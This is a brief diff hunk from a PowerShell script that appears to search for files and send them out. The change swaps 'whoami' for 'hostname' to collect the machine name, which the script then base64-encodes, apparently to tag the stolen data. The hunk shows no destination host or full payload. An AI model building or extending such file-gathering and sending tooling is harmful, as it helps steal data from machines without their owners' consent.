@@ -34,7 +34,7 @@ function Sendfiles-files ($content, $filename, $hostname)
 
 Search-files
 
-$hostname = whoami
+$hostname = hostname
 $hostname = [System.Text.Encoding]::UTF8.GetBytes($hostname)
 $hostname = [Convert]::ToBase64String($hostname)
 
